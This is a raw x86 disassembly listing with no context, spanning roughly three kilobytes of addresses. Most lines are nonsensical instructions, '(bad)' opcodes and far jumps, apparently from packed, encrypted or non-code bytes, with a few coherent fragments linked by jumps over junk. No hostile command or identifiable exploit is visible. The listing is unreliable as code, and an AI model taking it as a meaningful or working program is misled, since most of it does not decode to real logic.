  411c18:	outs   dx,DWORD PTR ds:[esi]
  411c19:	pop    ecx
  411c1a:	(bad)  
  411c1b:	sub    eax,0x7962cf87
  411c20:	ins    BYTE PTR es:[edi],dx
  411c21:	dec    esi
  411c22:	mov    ah,0xec
  411c24:	mov    ah,0x1e
  411c26:	fmul   DWORD PTR [edi]
  411c28:	cwde   
  411c29:	shl    BYTE PTR [bp+di+0x367],cl
  411c2e:	or     ebp,DWORD PTR [esi-0x16]
  411c31:	shr    DWORD PTR [edi-0x23ea3dca],1
  411c37:	jbe    0x411c62
  411c39:	or     ch,BYTE PTR [edi+0x44195bb5]
  411c3f:	pop    ebx
  411c40:	clc    
  411c41:	add    edx,esp
  411c43:	adc    bh,BYTE PTR [esi-0x7f079fd]
  411c49:	and    eax,0x60707a33
  411c4e:	and    al,0x99
  411c50:	add    dh,BYTE PTR [ecx+ebp*4]
  411c53:	fisttp WORD PTR [esp+ebx*1+0x1d]
  411c57:	xchg   esi,eax
  411c58:	psubd  mm7,QWORD PTR [eax-0x68]
  411c5c:	xor    al,0x98
  411c5e:	shl    BYTE PTR [esi-0x5b4549e],cl
  411c64:	daa    
  411c65:	push   esi
  411c66:	test   BYTE PTR [eax-0x68],bh
  411c69:	jge    0x411c2b
  411c6b:	jp     0x411c4a
  411c6d:	shl    ah,1
  411c6f:	loopne 0x411c26
  411c71:	cmp    al,0x5f
  411c73:	xchg   edx,eax
  411c74:	mov    ebx,es
  411c76:	call   0xe480:0x96fdd104
  411c7d:	and    esi,DWORD PTR [edi-0x33]
  411c80:	adc    BYTE PTR [eax],al
  411c82:	sub    ch,BYTE PTR [edx+0x186ecd40]
  411c88:	xchg   esi,eax
  411c89:	or     DWORD PTR [edx],0x3fc3886e
  411c8f:	fsubr  DWORD PTR [esi+0x40]
  411c92:	push   ecx
  411c93:	add    DWORD PTR [edi],0xec7facd4
  411c99:	and    dl,BYTE PTR [ecx-0x7e8b3356]
  411c9f:	retw   0xb30a
  411ca3:	retf   
  411ca4:	imul   ecx,esi,0xffffffe1
  411ca7:	jo     0x411ccc
  411ca9:	call   0x64c9:0xa13747dc
  411cb0:	mov    edx,0xe1897636
  411cb5:	xor    eax,0x81f9854a
  411cba:	add    eax,0xd71c4197
  411cbf:	and    eax,0xd67efc5f
  411cc4:	sbb    BYTE PTR [ecx+edi*1],bh
  411cc7:	sub    eax,0x3bce7217
  411ccc:	lahf   
  411ccd:	or     DWORD PTR [ebx+0x7c],ebx
  411cd0:	sar    BYTE PTR [ebp+0x61c32d2e],0xf4
  411cd7:	inc    edi
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xa366579e
  411cfd:	mov    ah,0x24
  411cff:	fwait
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411d0a:	mov    ebp,0x468e2993
  411d0f:	add    DWORD PTR [esi],edi
  411d11:	std    
  411d12:	stos   DWORD PTR es:[edi],eax
  411d13:	jno    0x411cde
  411d15:	ret    0x8b3f
  411d18:	push   ebx
  411d19:	fcmove st,st(3)
  411d1b:	aad    0x49
  411d1d:	iret   
  411d1e:	out    dx,eax
  411d1f:	inc    eax
  411d20:	fld    DWORD PTR [ecx+0x58]
  411d23:	mov    ah,0x18
  411d25:	data16 add al,0x20
  411d28:	cmp    dl,BYTE PTR [edx-0x9473956]
  411d2e:	imul   esp,esi,0xe3417da8
  411d34:	xor    esi,eax
  411d36:	lahf   
  411d37:	pop    esi
  411d38:	add    al,0x9a
  411d3a:	pop    ds
  411d3b:	enter  0xb856,0xac
  411d3f:	jnp    0x411d1b
  411d41:	jg     0x411da4
  411d43:	shl    esp,cl
  411d45:	add    al,0xba
  411d47:	xchg   ecx,eax
  411d48:	fdiv   QWORD PTR [ecx+0x18]
  411d4b:	mov    dh,0x6f
  411d4d:	cs adc al,0x6a
  411d50:	pop    ebp
  411d51:	jb     0x411cdd
  411d53:	shr    BYTE PTR [ecx],1
  411d55:	cs in  eax,dx
  411d57:	sti    
  411d58:	xchg   esp,eax
  411d59:	lock and dl,BYTE PTR ds:0x465c8e24
  411d60:	rcr    BYTE PTR [eax],cl
  411d62:	scas   eax,DWORD PTR es:[edi]
  411d63:	xor    al,0xed
  411d65:	cmp    ch,BYTE PTR [ebx+0x53398722]
  411d6b:	cmp    al,0x6f
  411d6d:	jno    0x411d31
  411d6f:	repz ret 0xac93
  411d73:	adc    bl,BYTE PTR [ebp+ebx*4-0x2db25ae0]
  411d7a:	sti    
  411d7b:	mov    DWORD PTR ds:0x4b7e00e7,0x61552a5f
  411d85:	mov    ds:0xe73ff03a,eax
  411d8a:	popf   
  411d8b:	xor    DWORD PTR [esi+ecx*4],edi
  411d8e:	out    0x67,al
  411d90:	inc    esp
  411d91:	mov    esp,0x480e9343
  411d96:	sbb    cl,cl
  411d98:	mul    DWORD PTR [esi+0x1e]
  411d9b:	sub    DWORD PTR fs:[esi+0x16fb45f8],ecx
  411da2:	mov    cl,cl
  411da4:	mov    esp,0xd1fa5f40
  411da9:	cmp    DWORD PTR [esi],0x7d96fac0
  411daf:	jle    0x411e14
  411db1:	aam    0xe9
  411db3:	xor    ecx,esp
  411db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db6:	outs   dx,DWORD PTR ds:[esi]
  411db7:	pushf  
  411db8:	fimul  WORD PTR [ecx+0x3e]
  411dbb:	gs jle 0x411df5
  411dbe:	stc    
  411dbf:	sbb    ch,cl
  411dc1:	int3   
  411dc2:	mov    eax,0xcccb45bc
  411dc7:	mov    eax,0xdf83b6a6
  411dcc:	test   BYTE PTR [ebp+0x3],0x36
  411dd0:	stos   BYTE PTR es:[edi],al
  411dd1:	pop    esp
  411dd2:	or     dh,al
  411dd4:	jmp    0x6af0:0xd80c44cb
  411ddb:	dec    ecx
  411ddc:	mul    BYTE PTR [edx+0x7f92af58]
  411de2:	add    al,dh
  411de4:	mov    edx,0x451dc89b
  411de9:	mov    cl,ah
  411deb:	loope  0x411dad
  411ded:	pop    eax
  411dee:	push   0xffffffe9
  411df0:	xchg   ebx,eax
  411df1:	mov    ds:0x116a5339,al
  411df6:	clc    
  411df7:	iret   
  411df8:	cmp    eax,0xad3e7177
  411dfd:	lds    ebx,FWORD PTR [edi]
  411dff:	icebp  
  411e00:	mov    ecx,0x5be84367
  411e05:	mov    al,ds:0xb80aaf02
  411e0a:	sub    edx,DWORD PTR [ecx]
  411e0c:	pop    ds
  411e0d:	jne    0x411e4c
  411e0f:	and    eax,DWORD PTR [ebp-0x6c04184f]
  411e15:	jne    0x411e68
  411e17:	mov    bh,0x6e
  411e19:	mov    ch,0xae
  411e1b:	test   al,0x59
  411e1d:	mov    DWORD PTR [ecx],ecx
  411e1f:	mov    al,ds:0x19290ffe
  411e24:	jmp    0x411e01
  411e26:	inc    esp
  411e27:	mov    ds:0x47bcba97,al
  411e2c:	sbb    al,0x3c
  411e2e:	scas   eax,DWORD PTR es:[edi]
  411e2f:	aas    
  411e30:	push   ecx
  411e31:	sub    DWORD PTR [esi+0x2e138b8],0xdf2038c3
  411e3b:	push   esi
  411e3c:	popa   
  411e3d:	adc    eax,0x52c86415
  411e42:	push   esp
  411e43:	mov    ecx,0xbc7bf73d
  411e48:	loopne 0x411eaf
  411e4a:	aam    0xcd
  411e4c:	aaa    
  411e4d:	(bad)  
  411e4e:	adc    ebp,ecx
  411e50:	mov    dh,0x45
  411e52:	lds    esp,FWORD PTR [ebx]
  411e54:	inc    edi
  411e55:	mov    cl,0xc5
  411e57:	sahf   
  411e58:	stos   BYTE PTR es:[edi],al
  411e59:	cmp    eax,0x683e2236
  411e5e:	xchg   BYTE PTR [edx+edi*4-0x25ffbe6d],bl
  411e65:	cmp    BYTE PTR [ebx-0x57],al
  411e68:	sbb    bh,BYTE PTR [esi-0x32350726]
  411e6e:	test   eax,0x3ecbaeda
  411e73:	sub    eax,DWORD PTR [edi+0x7fa15da7]
  411e79:	stos   BYTE PTR es:[edi],al
  411e7a:	outs   dx,DWORD PTR ds:[esi]
  411e7b:	xchg   esi,eax
  411e7c:	cmc    
  411e7d:	jne    0x411e6b
  411e7f:	sbb    eax,0x2360ac80
  411e84:	xchg   edi,eax
  411e85:	xor    BYTE PTR [ebp+edi*8-0x74],bl
  411e89:	mov    ebx,0xe5bcf0f4
  411e8e:	retf   
  411e8f:	lods   al,BYTE PTR ds:[esi]
  411e90:	push   ecx
  411e91:	retf   0x1ee6
  411e94:	ffreep st(5)
  411e96:	bound  ebx,QWORD PTR [edx+0x5d]
  411e99:	int3   
  411e9a:	in     al,dx
  411e9b:	leave  
  411e9c:	and    bl,BYTE PTR [esi+eiz*8-0x20145b96]
  411ea3:	xor    BYTE PTR [eax],ch
  411ea5:	inc    eax
  411ea6:	and    bh,BYTE PTR [ecx+ecx*2-0x22]
  411eaa:	popf   
  411eab:	in     eax,dx
  411eac:	inc    ebp
  411ead:	daa    
  411eae:	push   0x23
  411eb0:	test   DWORD PTR [edx-0x5],ebp
  411eb3:	inc    esi
  411eb4:	xchg   ebx,eax
  411eb5:	jge    0x411e99
  411eb7:	pop    esp
  411eb8:	ret    0x4903
  411ebb:	inc    edx
  411ebc:	mov    dh,0xfd
  411ebe:	push   ecx
  411ebf:	test   ebx,esp
  411ec1:	cmp    esp,esp
  411ec3:	pop    es
  411ec4:	shl    BYTE PTR [ecx-0xec29de8],1
  411eca:	nop
  411ecb:	or     eax,0x1d999c1d
  411ed0:	fiadd  WORD PTR [edi-0xb]
  411ed3:	clc    
  411ed4:	cwde   
  411ed5:	mov    esp,0xf9fc1636
  411eda:	pushf  
  411edb:	nop
  411edc:	pop    edi
  411edd:	dec    edx
  411ede:	dec    ebx
  411edf:	and    eax,0x9a1284a6
  411ee4:	jp     0x411e66
  411ee6:	mov    esp,0x3cae0d84
  411eeb:	int    0xb3
  411eed:	sbb    edx,DWORD PTR [esi+0x53f4355b]
  411ef3:	push   es
  411ef4:	cmp    al,0xe7
  411ef6:	jne    0x411ea3
  411ef8:	repnz out 0xc9,al
  411efb:	inc    ebp
  411efc:	or     ah,0xc6
  411eff:	jb     0x411f44
  411f01:	and    al,0xbe
  411f03:	add    al,BYTE PTR ds:0x798a5a4c
  411f09:	push   esi
  411f0a:	retf   0xcac7
  411f0d:	adc    DWORD PTR [edx-0x55fbcd46],ecx
  411f13:	(bad)  
  411f14:	stc    
  411f15:	rol    BYTE PTR [edi+eiz*8],cl
  411f18:	sahf   
  411f19:	into   
  411f1a:	into   
  411f1b:	pop    esi
  411f1c:	in     eax,dx
  411f1d:	inc    esi
  411f1e:	mov    ebp,0x6f50e01e
  411f24:	leave  
  411f25:	icebp  
  411f26:	repnz adc DWORD PTR [ebx+0x35637061],0x53
  411f2e:	ficomp WORD PTR [edi-0x62]
  411f31:	stc    
  411f32:	int3   
  411f33:	test   BYTE PTR [edx+0x58],al
  411f36:	loop   0x411f9c
  411f38:	fs push ds
  411f3a:	jnp    0x411edd
  411f3c:	xor    DWORD PTR [ebp-0x52],ebx
  411f3f:	scas   al,BYTE PTR es:[edi]
  411f40:	daa    
  411f41:	and    DWORD PTR [ebp+0x6a3cf144],esp
  411f47:	iret   
  411f48:	leave  
  411f49:	or     BYTE PTR [edx-0x5f],dl
  411f4c:	in     al,0x15
  411f4e:	ret    
  411f4f:	std    
  411f50:	xchg   esp,eax
  411f51:	idiv   DWORD PTR [esi-0xa18872]
  411f57:	pop    es
  411f58:	sti    
  411f59:	pop    ebp
  411f5a:	mov    esi,0x9936436a
  411f5f:	or     ebp,DWORD PTR cs:[esi+edi*2-0x50958a1e]
  411f67:	inc    esi
  411f68:	icebp  
  411f69:	add    DWORD PTR [edx-0x65],0xffffffb3
  411f6d:	pop    ds
  411f6e:	gs pop edi
  411f70:	mov    ecx,0x558b3f0e
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	mov    eax,0xebd1f892
  411f93:	imul   edi,DWORD PTR [eax+0x78],0xffffffe5
  411f97:	jle    0x412011
  411f99:	js     0x411ffa
  411f9b:	or     edi,DWORD PTR [esi+0x378d5ced]
  411fa1:	test   al,0xa2
  411fa3:	fbstp  TBYTE PTR [edx-0x7cee3dcf]
  411fa9:	shl    DWORD PTR [ebx-0x247290dc],1
  411faf:	push   ecx
  411fb0:	lods   eax,DWORD PTR ds:[esi]
  411fb1:	mov    bh,0xd
  411fb3:	jmp    0xd2807f0
  411fb8:	mov    ebp,0x3367f413
  411fbd:	pop    ebp
  411fbe:	mov    ds,esp
  411fc0:	lock mov ebp,0x67441bb6
  411fc6:	cld    
  411fc7:	add    al,BYTE PTR [edi+0x7f5ef3d0]
  411fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fce:	sub    eax,ebx
  411fd0:	xchg   edi,eax
  411fd1:	inc    ebx
  411fd2:	xchg   edx,eax
  411fd3:	cwde   
  411fd4:	jge    0x411fec
  411fd6:	in     al,0x56
  411fd8:	sub    edx,ebx
  411fda:	jb     0x411f76
  411fdc:	(bad)  [edi+eiz*2+0x10]
  411fe0:	pop    esp
  411fe1:	dec    edx
  411fe2:	cmp    DWORD PTR [ebp+0x58],edx
  411fe5:	fmul   DWORD PTR [esi]
  411fe7:	addr16 push esi
  411fe9:	push   ss
  411fea:	lock aas 
  411fec:	mov    ah,0x82
  411fee:	das    
  411fef:	ror    dh,cl
  411ff1:	call   0xecc1:0x63175e73
  411ff8:	test   al,0x5b
  411ffa:	cs shl dl,0xf3
  411ffe:	fcomp  DWORD PTR [ebx-0xbd15f4e]
  412004:	or     eax,0xe05f6a99
  412009:	xchg   ecx,eax
  41200a:	fs add al,0x3e
  41200d:	dec    ebp
  41200e:	jmp    0xeeb4:0x6586ff7a
  412015:	xchg   ebp,eax
  412016:	mov    bl,0xe
  412018:	mov    ah,0x7b
  41201a:	pop    ebp
  41201b:	pop    eax
  41201c:	add    al,0xc3
  41201e:	rol    bh,cl
  412020:	xor    esp,DWORD PTR [eax]
  412022:	inc    edx
  412023:	ret    
  412024:	call   0xea14d9aa
  412029:	mov    ds:0x19778845,al
  41202e:	and    BYTE PTR [eax-0x4c],cl
  412031:	jns    0x411fda
  412033:	inc    esi
  412034:	mov    esp,0x3d65d61d
  412039:	les    edi,FWORD PTR [edx-0x4118dee2]
  41203f:	test   eax,0xb0c41279
  412044:	cmp    bh,dl
  412046:	add    ecx,DWORD PTR [eax-0x47]
  412049:	sbb    ch,BYTE PTR [eax]
  41204b:	inc    ebp
  41204c:	jmp    0xa441:0x314c625f
  412053:	adc    edx,ecx
  412055:	sbb    DWORD PTR [ecx],ebx
  412057:	jnp    0x4120ac
  412059:	fwait
  41205a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41205b:	clc    
  41205c:	mov    eax,ds:0x37565e9e
  412061:	stos   BYTE PTR es:[edi],al
  412062:	adc    cl,al
  412064:	lock jb 0x412032
  412067:	add    ebx,DWORD PTR [eax+0x75]
  41206a:	pop    edx
  41206b:	lock pop ebx
  41206d:	mov    al,ds:0x1591746f
  412072:	mov    ch,0x6a
  412074:	or     BYTE PTR [eax],cl
  412076:	or     BYTE PTR [esi-0x9],cl
  412079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207a:	mov    cl,0xed
  41207c:	push   edx
  41207d:	or     ch,cl
  41207f:	sub    ecx,ecx
  412081:	cmp    al,BYTE PTR [eax-0x13]
  412084:	jmp    0x28bd:0x9cb19962
  41208b:	retf   
  41208c:	dec    edx
  41208d:	inc    edi
  41208e:	sbb    eax,0xd63a90b0
  412093:	retf   0x76d7
  412096:	adc    al,0x20
  412098:	pop    es
  412099:	xchg   edi,eax
  41209a:	sub    dh,BYTE PTR [ebp+0x4048db99]
  4120a0:	mov    dh,ch
  4120a2:	mov    WORD PTR [edx-0x47],cs
  4120a5:	test   BYTE PTR [edi-0x6a],ch
  4120a8:	inc    esp
  4120a9:	xchg   esp,eax
  4120aa:	lods   al,BYTE PTR ds:[esi]
  4120ab:	mov    BYTE PTR [edi],ah
  4120ad:	pusha  
  4120ae:	jbe    0x41203d
  4120b0:	test   ebp,edi
  4120b2:	bound  esp,QWORD PTR [ecx+0x1cda80fd]
  4120b8:	hlt    
  4120b9:	jo     0x412136
  4120bb:	xchg   esi,eax
  4120bc:	lods   al,BYTE PTR ds:[esi]
  4120bd:	mov    BYTE PTR [edi],al
  4120bf:	test   BYTE PTR ds:[ecx],dl
  4120c2:	mov    ch,0xed
  4120c4:	inc    esp
  4120c5:	mov    al,BYTE PTR [edx+0x57]
  4120c8:	fist   WORD PTR [ecx-0x2c]
  4120cb:	fwait
  4120cc:	dec    ebp
  4120cd:	pop    eax
  4120ce:	ds enter 0xf5a4,0x36
  4120d3:	adc    BYTE PTR [ecx+0x5b406f43],0xff
  4120da:	outs   dx,BYTE PTR ds:[esi]
  4120db:	jbe    0x4120a4
  4120dd:	je     0x4120a7
  4120df:	sbb    DWORD PTR ds:0x572a0a76,ecx
  4120e5:	pusha  
  4120e6:	fucomi st,st(0)
  4120e8:	aam    0x24
  4120ea:	jnp    0x4120b3
  4120ec:	cmc    
  4120ed:	adc    al,0x4a
  4120ef:	dec    edi
  4120f0:	sbb    BYTE PTR [ebp+0x54],dl
  4120f3:	sbb    edi,DWORD PTR [edx]
  4120f5:	or     bh,BYTE PTR [ecx]
  4120f7:	mov    al,bl
  4120f9:	mov    cl,0x76
  4120fb:	mov    edi,0xab039f3a
  412100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412101:	and    bh,0x3c
  412104:	iret   
  412105:	mov    dl,BYTE PTR [esp+esi*4+0x47239b4b]
  41210c:	pop    edx
  41210d:	or     BYTE PTR ds:0x3c065452,dl
  412113:	and    eax,0x6d4345a1
  412118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412119:	mov    al,ds:0x8e15e792
  41211e:	arpl   WORD PTR [ebx],dx
  412120:	call   0xab56:0x3b13ae9a
  412127:	mov    ebx,0x3057b79f
  41212c:	daa    
  41212d:	fidiv  DWORD PTR [ebx]
  41212f:	popf   
  412130:	pop    edi
  412131:	mov    edx,0xbe1b9e47
  412136:	cs jmp 0x528154ab
  41213c:	outs   dx,DWORD PTR ds:[esi]
  41213d:	bound  esi,QWORD PTR [esi]
  41213f:	test   BYTE PTR [ebp-0x758226f9],bh
  412145:	test   DWORD PTR [edi+0x7e],eax
  412148:	aas    
  412149:	mov    ebp,DWORD PTR [edx-0x7]
  41214c:	test   DWORD PTR [ebx+0x1cf8c7e2],0xbbae2411
  412156:	and    edx,edi
  412158:	leave  
  412159:	dec    esp
  41215a:	pop    edi
  41215b:	mov    BYTE PTR fs:[eax-0x1c],ch
  41215f:	push   edx
  412160:	les    esp,FWORD PTR [esi]
  412162:	push   ebx
  412163:	pop    esp
  412164:	shl    BYTE PTR [ebx-0x36],1
  412167:	and    BYTE PTR [ecx+0x5df21aff],dl
  41216d:	adc    cl,BYTE PTR [ebx+ebx*2]
  412170:	scas   eax,DWORD PTR es:[edi]
  412171:	push   eax
  412172:	imul   BYTE PTR [edx-0x45]
  412175:	ror    eax,0x26
  412178:	ja     0x41210d
  41217a:	xchg   esp,eax
  41217b:	adc    DWORD PTR [edx-0x4],edi
  41217e:	pop    edx
  41217f:	jo     0x4121b5
  412181:	dec    ecx
  412182:	nop
  412183:	dec    ebx
  412184:	fistp  QWORD PTR [eax+ebx*8-0x19]
  412188:	sub    ch,cl
  41218a:	pop    esp
  41218b:	push   ss
  41218c:	(bad)  
  41218d:	jmp    0x7047:0x91df7997
  412194:	push   esi
  412195:	aam    0xc9
  412197:	aad    0x1a
  412199:	(bad)  
  41219a:	std    
  41219b:	pop    esp
  41219c:	mov    esp,0x2f6732ac
  4121a1:	push   ds
  4121a2:	and    esi,edi
  4121a4:	mov    ds:0xf86189d0,al
  4121a9:	push   ebx
  4121aa:	call   FWORD PTR [eax+0x60ab4016]
  4121b0:	sbb    BYTE PTR [edi+0x555c56bd],dl
  4121b6:	fs xchg DWORD PTR fs:[esi+esi*2],esi
  4121bb:	and    al,0x59
  4121bd:	inc    ebp
  4121be:	xchg   edi,eax
  4121bf:	jge    0x4121cd
  4121c1:	mov    ecx,0x4335ea0b
  4121c6:	in     eax,dx
  4121c7:	mov    ebx,0x19d5b43
  4121cc:	cmp    ch,BYTE PTR fs:[eax]
  4121cf:	mov    WORD PTR [ecx-0x4f],?
  4121d2:	in     eax,0xb8
  4121d4:	dec    esi
  4121d5:	je     0x4121b2
  4121d7:	add    BYTE PTR [eax],0xc8
  4121da:	jno    0x412164
  4121dc:	mov    edi,0x352d90ed
  4121e1:	push   es
  4121e2:	jbe    0x412210
  4121e4:	mov    dh,0x46
  4121e6:	mov    ss,WORD PTR [ecx+0x63469214]
  4121ec:	or     DWORD PTR [esi],edx
  4121ee:	add    al,0xc3
  4121f0:	dec    ebx
  4121f1:	dec    BYTE PTR [edi]
  4121f3:	aam    0xaa
  4121f5:	push   ss
  4121f6:	jmp    0x60bb3402
  4121fb:	(bad)  
  4121fc:	jmp    0x5931:0xb70c3cf8
  412203:	dec    esp
  412204:	inc    edx
  412205:	add    edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	add    ch,dh
  412235:	add    al,0xd4
  412237:	push   eax
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	jo     0x4121da
  412241:	cwde   
  412242:	mov    cs,ebx
  412244:	fucomi st,st(4)
  412246:	mov    ds:0xc51b5c9e,al
  41224b:	push   eax
  41224c:	sbb    edx,esi
  41224e:	sbb    bh,BYTE PTR [edx+0x53]
  412251:	gs ins BYTE PTR es:[edi],dx
  412253:	(bad)  
  412255:	inc    ecx
  412256:	sbb    DWORD PTR [eax],ebp
  412258:	pop    esi
  412259:	add    DWORD PTR [edi+0x6a],0xffffff89
  41225d:	in     al,dx
  41225e:	stos   BYTE PTR es:[edi],al
  41225f:	retf   
  412260:	ja     0x4122c7
  412262:	sbb    DWORD PTR [esi+0x2a64203e],ebp
  412268:	xor    ecx,edx
  41226a:	sub    eax,0x65adeec7
  41226f:	jmp    0x41224e
  412271:	daa    
  412272:	aam    0x9
  412274:	call   0x2442b1c
  412279:	ja     0x412218
  41227b:	mov    ebx,0x9bd32e36
  412280:	xchg   esp,eax
  412281:	fiadd  DWORD PTR [ebx-0x765b9e4b]
  412287:	sbb    BYTE PTR [edx],bl
  412289:	test   al,0x6e
  41228b:	mov    esp,0xe1e4db
  412290:	stos   BYTE PTR es:[edi],al
  412291:	push   edi
  412292:	sti    
  412293:	ins    BYTE PTR es:[edi],dx
  412294:	shl    ebx,cl
  412296:	sub    al,0xf2
  412298:	pop    esp
  412299:	mov    bl,0x20
  41229b:	cmp    bh,BYTE PTR [esi+0x1c]
  41229e:	push   ebx
  41229f:	jne    0x4122ca
  4122a1:	movaps xmm7,xmm4
  4122a4:	aam    0x85
  4122a6:	adc    cl,dl
  4122a8:	outs   dx,BYTE PTR ds:[esi]
  4122a9:	mov    ds:0xf5b7f679,eax
  4122ae:	inc    BYTE PTR [esi+ecx*1-0x6cbba5e]
  4122b5:	bound  ebp,QWORD PTR [ecx+eiz*4-0x5e]
  4122b9:	ins    BYTE PTR es:[edi],dx
  4122ba:	lds    edx,FWORD PTR [edi]
  4122bc:	pop    ds
  4122bd:	popf   
  4122be:	jp     0x412282
  4122c0:	fcom   DWORD PTR [edx-0x4c880ada]
  4122c6:	sbb    al,0x9f
  4122c8:	cdq    
  4122c9:	dec    ecx
  4122ca:	sahf   
  4122cb:	icebp  
  4122cc:	das    
  4122cd:	fsubr  st,st(3)
  4122cf:	ins    DWORD PTR es:[edi],dx
  4122d0:	adc    al,0x5b
  4122d2:	sbb    bh,BYTE PTR [ebx-0x43]
  4122d5:	(bad)  [ebp-0x28]
  4122d8:	(bad)  
  4122d9:	clc    
  4122da:	push   0x4f
  4122dc:	mov    dh,0xf7
  4122de:	fbstp  TBYTE PTR ds:0x6722324d
  4122e4:	fcomi  st,st(3)
  4122e6:	lods   al,BYTE PTR ds:[esi]
  4122e7:	jl     0x4122c8
  4122e9:	pop    ebp
  4122ea:	sbb    edi,DWORD PTR [esi-0x398c37bd]
  4122f0:	dec    esi
  4122f1:	out    0x14,al
  4122f3:	div    DWORD PTR [edi-0x6a1e10db]
  4122f9:	or     BYTE PTR [esi+0x4832d516],dh
  4122ff:	jns    0x41236d
  412301:	je     0x412374
  412303:	js     0x41229d
  412305:	push   ds
  412306:	fcmovnb st,st(5)
  412308:	retf   0x25cd
  41230b:	int3   
  41230c:	adc    BYTE PTR [eax],al
  41230e:	jno    0x41231d
  412310:	adc    ecx,DWORD PTR [edi]
  412312:	lods   eax,DWORD PTR ds:[esi]
  412313:	xchg   edx,eax
  412314:	push   ebp
  412315:	mov    al,0x63
  412317:	ret    0xed43
  41231a:	das    
  41231b:	xchg   BYTE PTR [edx-0x65cf069b],ah
  412321:	fs adc al,0x19
  412324:	cld    
  412325:	in     al,0xd9
  412327:	or     eax,0xd72e5bee
  41232c:	jmp    0x955d:0xd551c4da
  412333:	into   
  412334:	pop    esp
  412335:	ins    BYTE PTR es:[edi],dx
  412336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412337:	push   ss
  412338:	xchg   esi,eax
  412339:	imul   ah
  41233b:	push   0xffffff9c
  41233d:	add    BYTE PTR [edx+ebp*4],cl
  412340:	data16 jo 0x412326
  412343:	gs (bad) 
  412345:	push   ebx
  412346:	sbb    esi,DWORD PTR [ebx]
  412348:	jne    0x4123a9
  41234a:	push   ebx
  41234b:	adc    esi,DWORD PTR [ecx]
  41234d:	push   edi
  41234e:	in     al,dx
  41234f:	outs   dx,DWORD PTR ds:[esi]
  412350:	arpl   cx,dx
  412352:	jb     0x412321
  412354:	pop    ds
  412355:	mov    ecx,0x69ac2e8b
  41235a:	les    ebp,FWORD PTR [ecx+eiz*2]
  41235d:	inc    edx
  41235e:	xchg   ch,ah
  412360:	cwde   
  412361:	and    dh,BYTE PTR [ebx+0x5]
  412364:	cs sahf 
  412366:	mov    ah,0xaa
  412368:	jb     0x4122ec
  41236a:	xchg   ebp,eax
  41236b:	shl    bh,cl
  41236d:	sar    al,0x4e
  412370:	push   esi
  412371:	inc    esp
  412372:	jae    0x412352
  412374:	xor    DWORD PTR [esp+ecx*4+0x42],esi
  412378:	ror    eax,cl
  41237a:	test   DWORD PTR [esi+0x7d51a6fe],edi
  412380:	test   al,0xe7
  412382:	(bad)  
  412383:	addr16 jbe 0x412355
  412386:	fidivr DWORD PTR [edi+0x7f61d48e]
  41238c:	xchg   ecx,eax
  41238d:	loope  0x4123e8
  41238f:	popa   
  412390:	jb     0x412397
  412392:	test   al,0x5e
  412394:	fucom  st(4)
  412396:	dec    edi
  412397:	rol    DWORD PTR [eax+eax*1],1
  41239a:	ds scas eax,DWORD PTR es:[edi]
  41239c:	push   edx
  41239d:	mov    edx,0xef8c5786
  4123a2:	sbb    cl,BYTE PTR [ecx+0x7cf8eeb9]
  4123a8:	xlat   BYTE PTR ds:[ebx]
  4123a9:	mov    eax,ds:0x3ad9739e
  4123ae:	out    dx,al
  4123af:	cwde   
  4123b0:	nop
  4123b1:	pop    esp
  4123b2:	pushf  
  4123b3:	int    0x50
  4123b5:	mov    esi,0xcb74ee74
  4123ba:	jge    0x4123ea
  4123bc:	std    
  4123bd:	lods   eax,DWORD PTR ds:[esi]
  4123be:	scas   al,BYTE PTR es:[edi]
  4123bf:	add    DWORD PTR [ecx-0x5c702581],esi
  4123c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c6:	lods   al,BYTE PTR ds:[esi]
  4123c7:	sub    al,BYTE PTR [eax+0x48690374]
  4123cd:	outs   dx,DWORD PTR ds:[esi]
  4123ce:	out    0x5b,eax
  4123d0:	inc    ebx
  4123d1:	and    bh,BYTE PTR [ebp-0x193ee58e]
  4123d7:	out    0x2a,eax
  4123d9:	push   ebx
  4123da:	and    eax,0x993b2adb
  4123df:	call   edi
  4123e1:	push   es
  4123e2:	add    ecx,edx
  4123e4:	cmp    eax,0xbbf30a43
  4123e9:	inc    eax
  4123ea:	into   
  4123eb:	pushf  
  4123ec:	daa    
  4123ed:	and    BYTE PTR [eax],cl
  4123ef:	mov    al,ds:0x59cafaaf
  4123f4:	ins    DWORD PTR es:[edi],dx
  4123f5:	jnp    0x41244d
